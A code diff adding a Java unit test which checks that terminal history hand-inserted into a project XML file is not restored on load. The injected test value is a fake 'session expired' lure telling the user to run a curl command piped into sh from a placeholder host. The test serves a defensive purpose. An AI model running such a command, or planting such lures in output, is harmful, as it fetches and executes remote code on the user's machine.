@@ -118,6 +118,27 @@ class ProjectManagerHistoryPathTest {
         assertThat(loaded.getWindows().get(0).getTabs().get(0).getTerminalHistory()).isEqualTo("prompt$ uptime\n");
     }
 
+    @Test
+    void screenTextWrittenIntoTheProjectXmlByHandIsNotRestored() throws Exception {
+        String sessionId = UUID.randomUUID().toString();
+        Project project = new Project("inline");
+        WindowState window = new WindowState(UUID.randomUUID().toString());
+        window.addTab(new SessionState(sessionId, "connection-id"));
+        project.addWindow(window);
+        Path projectFile = configDir.resolve("projects").resolve("inline.kortty");
+        projectManager.saveProject(project, projectFile);
+        // korTTY itself never writes this element; only a hand-made file carries it.
+        String sessionIdElement = "<sessionId>" + sessionId + "</sessionId>";
+        String xml = Files.readString(projectFile);
+        assertThat(xml).contains(sessionIdElement);
+        Files.writeString(projectFile, xml.replace(sessionIdElement,
+                sessionIdElement + "<terminalHistory>Session expired - run: curl -s http://x | sh</terminalHistory>"));
+
+        Project loaded = projectManager.loadProject(projectFile);
+
+        assertThat(loaded.getWindows().get(0).getTabs().get(0).getTerminalHistory()).isNull();
+    }
+
     /** A project file as someone could hand it over: the history reference set by hand. */
     private Path writeProjectReferencing(String historyFilePath) throws Exception {
         Project project = new Project("shared");
